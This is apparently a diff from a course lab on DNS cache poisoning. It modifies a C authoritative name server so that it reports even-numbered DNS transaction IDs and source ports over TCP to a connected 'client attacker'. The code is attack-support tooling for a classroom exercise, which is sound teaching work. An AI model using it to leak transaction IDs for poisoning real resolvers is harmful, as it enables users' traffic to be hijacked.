@@ -21,7 +21,7 @@
 #include <string.h>
 
 
-int send_txid(unsigned short txid);
+int send_txid(int client_sock, unsigned short txid);
 
 
 int create_dns_response(int txid, const char* query_name) {
@@ -150,7 +150,7 @@ void send_to_attacker_client(uint16_t txid, uint16_t source_port) {
 }
 
 
-int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter){
+int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter, int client_sock){
 
     // CHECK IF THE TXID IS ODD
     if (txid & 1){
@@ -168,7 +168,7 @@ int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter){
       printf("source port %u :\n", source_port);
       char* response_cname = "www.example.cybercourse.com";
       // Send the even txid to the client (send TXID)
-      send_txid(txid);
+      send_txid(client_sock, txid);
       create_dns_response(txid, response_cname);
       return 1;
     } 
@@ -178,14 +178,35 @@ int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter){
 
 //####################################################################################################################
 
-int send_txid(unsigned short txid){
-    int sockfd;
-    struct sockaddr_in server_addr, client_addr;
-    socklen_t client_addr_len = sizeof(client_addr);
+int send_txid(int client_sock, unsigned short txid){
     char buffer[BUFFER_SIZE];
 
-    // Step 1: Create a UDP socket
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    // TXID to send to the client (could be dynamically generated or static for simplicity)
+
+    // Prepare the message to send to the client
+    snprintf(buffer, sizeof(buffer), "TXID: %hu", txid);
+
+    // Send the TXID to the client
+    if (send(client_sock, buffer, strlen(buffer), 0) < 0) {
+        perror("Failed to send data to client");
+        close(client_sock);
+        return EXIT_FAILURE;
+    }
+
+    printf("Sent TXID to client: %hu\n", txid);
+    
+    // Close the connection after sending the response
+    close(client_sock);
+    return 0;
+}
+
+int connect_to_client(){
+    int sockfd;//, client_sock;
+    struct sockaddr_in server_addr;//, client_addr;
+    //socklen_t client_addr_len = sizeof(client_addr);
+
+    // Step 1: Create a socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
         perror("Socket creation failed");
         exit(EXIT_FAILURE);
@@ -194,8 +215,8 @@ int send_txid(unsigned short txid){
     // Step 2: Configure the server address
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(CLIENT_UDP_PORT);
-    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(SERVER_CLIENT_PORT);
+    server_addr.sin_addr.s_addr = INADDR_ANY;  // Listen on all interfaces
 
     // Step 3: Bind the socket to the server address
     if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
@@ -204,36 +225,38 @@ int send_txid(unsigned short txid){
         exit(EXIT_FAILURE);
     }
 
-    printf("UDP server listening on port %d...\n", CLIENT_UDP_PORT);
-
-    while (1) {
-        // Step 4: Receive a request from the client
-        memset(buffer, 0, BUFFER_SIZE);
-        int received_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &client_addr_len);
-        if (received_len < 0) {
-            perror("Failed to receive data");
-            continue;
-        }
-
-        printf("Received request from client: %s\n", buffer);
-
-        // Step 5: Send the TXID to the client
-        snprintf(buffer, sizeof(buffer), "TXID: %hu", txid);
-
-        if (sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&client_addr, client_addr_len) < 0) {
-            perror("Failed to send data to client");
-        } else {
-            printf("Sent TXID to client: %hu\n", txid);
-        }
+    // Step 4: Listen for incoming connections
+    if (listen(sockfd, 5) < 0) {
+        perror("Listen failed");
+        close(sockfd);
+        exit(EXIT_FAILURE);
     }
 
-    // Close the socket
-    close(sockfd);
-    return 0;
+    printf("Server listening on port %d...\n", SERVER_CLIENT_PORT);
+    return sockfd;
 }
 
 
 int main() {
+    int client_sock;
+    struct sockaddr_in client_addr1;
+    socklen_t client_addr_len1 = sizeof(client_addr1);
+    int status = connect_to_client();
+    if (status < 0){
+      printf("Failed to connect to client attacker\n");
+      return EXIT_FAILURE;
+    }
+    client_sock = accept(status, (struct sockaddr *)&client_addr1, &client_addr_len1);
+    if (client_sock < 0) {
+        perror("Accept failed");
+        return EXIT_FAILURE;
+
+    }
+
+    printf("Client connected: %s:%d\n", inet_ntoa(client_addr1.sin_addr), ntohs(client_addr1.sin_port));
+
+
+
 
     struct sockaddr_in server_addr, client_addr;
     char buffer[BUFFER_SIZE];
@@ -260,7 +283,6 @@ int main() {
         close(sockfd);
         exit(EXIT_FAILURE);
     }
-
     int counter = 0;
     printf("Authoritative name server running on port %d...\n", SERVER_PORT);
     int even_found = 0;
@@ -285,8 +307,7 @@ int main() {
         uint16_t txid = ldns_pkt_id(query_pkt);
         printf("Received query with TXID: %u \n", txid);
 
-        even_found = even_odd_part(txid, client_addr, &counter);
+        even_found = even_odd_part(txid, client_addr, &counter, client_sock);
 
   }
-  close(sockfd);
 }
